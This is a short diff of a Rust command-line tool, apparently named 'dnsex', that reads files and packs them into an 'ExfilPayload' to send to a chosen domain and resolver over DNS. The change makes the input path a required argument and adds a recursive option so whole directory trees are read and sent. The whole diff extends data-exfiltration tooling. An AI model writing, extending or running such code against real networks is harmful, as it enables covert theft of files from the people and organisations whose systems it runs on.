@@ -44,14 +44,17 @@ enum Commands {
         #[arg(short, long, default_value_t = 8053)]
         port: u16,
 
-        #[arg(short, long)]
-        file: Option<String>,
+        #[arg()]
+        path: String,
 
         #[arg(long, default_value_t = 100)]
         rate_limit: u64,
 
         #[arg(long)]
         progress: bool,
+
+        #[arg(short, long)]
+        recursive: bool,
     },
 }
 
@@ -76,15 +79,11 @@ async fn main() -> Result<(), DnsexError> {
             domain,
             resolver,
             port,
-            file,
+            path,
             rate_limit,
             progress,
+            recursive,
         } => {
-            let path = match file {
-                Some(f) => f,
-                None => return Err(DnsexError::ArgumentError("missing input".to_string())),
-            };
-
             let client_config = ClientConfig {
                 domain,
                 resolver_ip: resolver,
@@ -97,7 +96,13 @@ async fn main() -> Result<(), DnsexError> {
             let path = Path::new(&path);
 
             if path.is_dir() {
-                for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()).filter(|e| e.file_type().is_file()) {
+                let walk_dir = if recursive {
+                    WalkDir::new(path)
+                } else {
+                    WalkDir::new(path).max_depth(1)
+                };
+
+                for entry in walk_dir.into_iter().filter_map(|e| e.ok()).filter(|e| e.file_type().is_file()) {
                     let entry_path = entry.path().display().to_string();
                     let bytes = fs::read(&entry_path).await?;
                     let payload = ExfilPayload {
